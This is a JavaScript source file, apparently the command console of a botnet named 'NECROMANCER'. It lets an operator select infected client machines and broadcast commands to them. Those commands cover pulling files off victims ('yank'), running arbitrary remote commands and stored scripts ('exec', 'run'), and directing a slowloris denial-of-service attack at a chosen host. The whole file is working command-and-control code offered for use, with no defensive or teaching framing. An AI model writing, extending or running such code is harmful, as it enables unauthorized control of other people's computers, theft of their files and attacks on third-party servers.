import readline from "readline";
import fs from "fs";
import { clientModules, broadcast } from "./server.js";

const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout,
});

let fileNum = 0;

export function prompt() {
	rl.question("\x1b[31m[NECROMANCER]\x1b[0m ", (message) => {
		message = message.toLowerCase();

		const commandArgs = {
			first: message.split(" ")[1],
			second: message.split(" ")[2],
			third: message.split(" ")[3],
			fourth: message.split(" ")[4],
		};

		if (message.startsWith("instances")) {
			if (message === "instances") {
				console.log(
					`Instances: ${clientModules.clientInstances.length}`
				);
			} else if (commandArgs.first <= clientModules.clients.length) {
				clientModules.clientInstances = [...clientModules.clients];
				clientModules.clientInstances =
					clientModules.clientInstances.slice(0, commandArgs.first);
			}
		}

		if (commandArgs.first === "all")
			clientModules.clientInstances = [...clientModules.clients];

		if (message.startsWith("select")) {
			clientModules.clientInstances = Array(
				clientModules.clientInstances[commandArgs.first]
			).filter((i) => i !== undefined);
		}

		if (message.startsWith("silent")) {
			if (message === "silent")
				console.log(`silent: ${clientModules.silent}`);
			else if (commandArgs.first === "true") {
				clientModules.silent = true;
			} else {
				clientModules.silent = false;
			}
		}

		if (message === "clear") console.clear();

		if (message.startsWith("yank")) {
			clientModules.logging = true;
			clientModules.silent = true;
			if (message === "yank")
				console.log("Please provide arugments: yank (file name)");
			else if (clientModules.clientInstances.length > 1)
				return console.log(
					"You can only use this command on one machine at a time"
				);
			else if (commandArgs.first !== undefined) {
				if (clientModules.logging) {
					fileNum++;
					broadcast(message);
				}
			}
		}

		if (message === "scripts") {
			listScripts();
		}

		if (message.startsWith("run")) {
			runScript(commandArgs.first);
		}

		if (message.startsWith("slowloris")) {
			if (message === "slowloris")
				console.log(
					"Please provide arguments: slowloris (host) (port) (duration ms) (sockets)"
				);
			else if (commandArgs.first !== undefined) {
				broadcast(message);
				console.log(`Attack sent!`);
			}

			let duration = commandArgs.third;

			if (commandArgs.third === undefined) {
				duration = 60000;
			}

			setTimeout(() => {
				console.log("Attack completed!");
			}, duration);
		}

		if (message.startsWith("exec")) {
			broadcast(message);
			clientModules.logging = false;
			clientModules.silent = false;
		}

		return prompt();
	});
}

const scriptsDir = "../config/scripts";

function listScripts() {
	fs.readdir(scriptsDir, (err, files) => {
		console.log("\nList of scripts in script dir:");
		files.forEach((file) => {
			if (file.includes(".cmd")) console.log(`\x1b[34m${file}\x1b[0m`);
		});
		prompt();
	});
}

function runScript(scriptName) {
	fs.readdir(scriptsDir, (err, files) => {
		files.forEach((file) => {
			if (file === scriptName) {
				fs.readFile(
					`${scriptsDir}/${scriptName}`,
					"utf8",
					(err, data) => {
						console.log("\x1b[91mRunning script...\x1b[0m");
						broadcast(`exec ${data}`);
					}
				);
			}
		});
		prompt();
	});
}

export function saveFile(chunk) {
	const writeStream = fs.createWriteStream(`file ${fileNum}`, { flags: "a" });
	writeStream.write(chunk);
}
